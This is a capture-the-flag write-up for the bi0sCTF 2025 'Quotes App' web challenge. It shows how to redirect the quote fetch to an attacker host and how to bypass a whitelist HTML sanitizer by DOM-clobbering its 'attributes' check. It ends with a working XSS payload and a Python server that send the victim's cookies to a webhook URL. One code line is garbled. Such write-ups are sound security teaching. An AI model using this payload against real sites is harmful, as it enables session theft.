---
title: "Quotes App - bi0sCTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "dom-clobbering", "cors", "quotes", "app", "bi0sctf", "bi0sctf-2025", "2025", "ctf-writeup"]
summary: "The task is an application with a built-in JavaScript sanitizer that processes user input by parsing the DOM."
source:
  name: "CTFtime writeup #40313"
  url: "https://ctftime.org/writeup/40313"
ctf:
  name: "bi0sCTF 2025"
  year: 2025
  challenge: "Quotes App"
---

## Metadata

- **CTF:** bi0sCTF 2025
- **Task:** Quotes App
- **Author team:** LCD
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40313>

---
# bios_2025_quotes_app

The task is an application with a built-in JavaScript sanitizer that processes user input by parsing the DOM.

The goal is to achieve XSS despite a bot checker, but user input seems absent at first glance.

The app has predefined quotes displayed by UUID upon button click.

Backend code for quote retrieval:

```python  
quotes = {  
"f47ac10b-58cc-4372-a567-0e02b2c3d479": "The only limit to our realization of tomorrow is our doubts of today. - Franklin D. Roosevelt",  
...  
"1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed": "Believe you can and you're halfway there. - Theodore Roosevelt"  
}

@app.route("/api/quotes/<uuid:quote_uuid_arg>", methods=['GET'])  
def get_quote(quote_uuid_arg):  
quote_uuid = str(quote_uuid_arg)  
if quote_uuid in quotes:  
return jsonify({"uuid": quote_uuid, "quote": quotes[quote_uuid]})  
else:  
return jsonify({"error": "Invalid uuid"}), 404  
```

The backend is simple and seems secure. Let's examine the frontend code for quote display:

```javascript  
const quoteIds = [  
"f47ac10b-58cc-4372-a567-0e02b2c3d479",  
...  
"1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed"  
];

function buildApiUrl(baseUrl, quoteId) {  
return new URL(quoteId, `${window.location.origin}${baseUrl}`).toString();  
}

async function fetchQuote(id) {  
const url = buildApiUrl("/api/quotes/", id);  
const response = await fetch(url, { method: "GET" });  
...  
const data = await response.json();  
return data.quote;  
}

async function loadQuoteFromUrl() {  
const params = new URLSearchParams(window.location.search);  
const quoteId = params.get("quoteid");  
...  
const quote = await fetchQuote(quoteId);  
quoteText.innerHTML = sanitizeHtml(quote);  
errorText.innerHTML = "";  
}  
```

The process for retrieving a quote:  
1\. Button click selects a UUID from the array.  
2\. A request is made with the UUID as the `quoteid` GET parameter.  
3\. The `quoteid` is extracted, forming a URL for `/api/quotes/<uuid>`.  
4\. The backend returns the quote.  
5\. The frontend sanitizes and renders the data.

There are unnecessary steps between UUID selection and data retrieval.

## Injecting a Custom Quote

We control only the `quoteid` parameter. The `loadQuoteFromUrl` function and this code raise suspicion:

```javascript  
function buildApiUrl(baseUrl, quoteId) {  
return new URL(quoteId, `${window.location.origin}${baseUrl}`).toString();  
}  
```

Testing URL generation manually:

```  
new URL('<uuid>', `${window.location.origin}/api/quotes/`).toString();  
'http://127.0.0.1:4000/api/quotes/<uuid>'  
```

Using a URL instead of a UUID works:

```  
new URL('<http://evil.com>', `${window.location.origin}/api/quotes/`).toString();  
'<http://evil.com/'>  
```

This allows fetching quotes from arbitrary hosts.

## Sanitizer Bypass

Quotes are sanitized before display via `sanitizer.js`. The sanitizer:  
1\. Parses input into a DOM tree using `DOMParser`:

```javascript  
const domParser = new window.DOMParser();  
const createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');  
```

2\. Retrieves all elements:

```javascript  
const elements = [].slice.call(createdDocument.body.querySelectorAll('*'));  
```

3\. Checks elements and attributes against a whitelist:

```javascript  
const DefaultWhitelist = {  
'*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],  
a: ['target', 'href', 'title', 'rel'],  
...  
img: ['src', 'alt', 'title', 'width', 'height'],  
...  
};  
```

`src` and `href` attributes are filtered by regex, preventing `javascript:` protocols.

Approaches tried based on similar write-ups:  
\- XSS with whitelisted tags  
\- m-XSS  
\- Shadow DOM  
\- DOM Clobbering

XSS with whitelisted tags failed (using PortSwigger cheat sheet: <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>).   
m-XSS payloads didn’t work.   
Shadow DOM exploration: The `<template>` tag creates an independent DOM tree, invisible to `domParser.parseFromString`:

```javascript  
const domParser = new window.DOMParser();  
const createdDocument = domParser.parseFromString('<template>![](https://ctftime.org/x)', 'text/html');  
[].slice.call(createdDocument.body.querySelectorAll('*')); // []  
```

However, this doesn’t help, as the sanitizer only returns validated elements, ignoring `<template>` content.

## DOM Clobbering

With minimal code outside the sanitizer, no gadgets for clobbering are apparent. Let’s analyze the sanitizer code:

```javascript  
const domParser = new window.DOMParser();  
const createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');  
const whitelistKeys = Object.keys(whiteList);  
const elements = [].slice.call(createdDocument.body.querySelectorAll('*'));

for (let i = 0, len = elements.length; i < len; i++) {  
const el = elements[i];  
const elName = el.nodeName.toLowerCase();  
if (whitelistKeys.indexOf(elName) === -1) {  
el.parentNode.removeChild(el);  
continue;  
}  
const attributeList = [].slice.call(el.attributes);  
const whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);  
attributeList.forEach((attr) => {  
if (!allowedAttribute(attr, whitelistedAttributes)) {  
el.removeAttribute(attr.nodeName);  
}  
});  
}  
return createdDocument.body.innerHTML;  
```

Bypassing attribute checks could enable XSS. Focus on:

```javascript  
const attributeList = [].slice.call(el.attributes);  
```

### Attribute Clobbering

DOM Clobbering can override `attributes` using the `name` attribute in `<form>`, ``, `<embed>`, or `<object>`. Nested clobbering example:

```html  
<form id="config">  
<input name="isTest" />  
<button id="isProd"></button>  
</form>  
<script>  
console.log(config); // <form id="config">  
console.log(config.isTest); // <input name="isTest" />  
console.log(config.isProd); // <button id="isProd"></button>  
</script>  
```

In `const attributeList = [].slice.call(el.attributes)`, `attributes` comes from our controlled DOM object. A payload like:

```html  
<form id="something">  
<input name="attributes" />  
</form>  
<script>  
console.log(something.attributes); // <input name="attributes" />  
</script>  
```

Yields in Chrome Dev Console:

```javascript  
const domParser = new window.DOMParser();  
const createdDocument = domParser.parseFromString(`<form id="something"><input nameалинаname="attributes" /></form>`, 'text/html');  
const elements = [].slice.call(createdDocument.body.querySelectorAll('*'));  
const el = elements[0];  
el; // <form id="something"><input name="attributes" /></form>  
[].slice.call(el.attributes); // []  
```

Also debuger can show that the `attributes` property is overridden, bypassing checks. 

![](<https://i.ibb.co/fdq5HZJb/image1.png>)  
![](<https://i.ibb.co/xKjH53xR/image2.png>)

A payload like:

```html  
<form id=x tabindex=0 onfocus='window.location="https://webhook/test?flag="+document.cookie' autofocus>  
<input id=attributes>  
```

Triggers XSS.

Final exploit:

```python  
import http.server  
import json

WEBHOOK = "https://webhook.site/3933a75d-9833-4d20-a1c0-ebba854544cf"

class MyHandler(http.server.BaseHTTPRequestHandler):  
def do_GET(self):  
self.send_response(200)  
self.send_header('Content-Type', 'application/json')  
self.send_header('Access-Control-Allow-Origin', '*')  
self.end_headers()  
response = {  
"quote": f"<form id=x tabindex=0 onfocus='window.location=\"{WEBHOOK}/?flag=\"+document.cookie' autofocus><input id=attributes>",  
"uuid": "f47ac10b-58cc-4372-a567-0e02b2c3d479"  
}  
self.wfile.write(json.dumps(response).encode())

if __name__ == '__main__':  
server_address = ('', 8000)  
httpd = http.server.HTTPServer(server_address, MyHandler)  
httpd.serve_forever()  
```

Host on a VPS or use ngrok, and provide the bot with:

```  
<http://task.com/?quoteid=http://ngrok>  
```
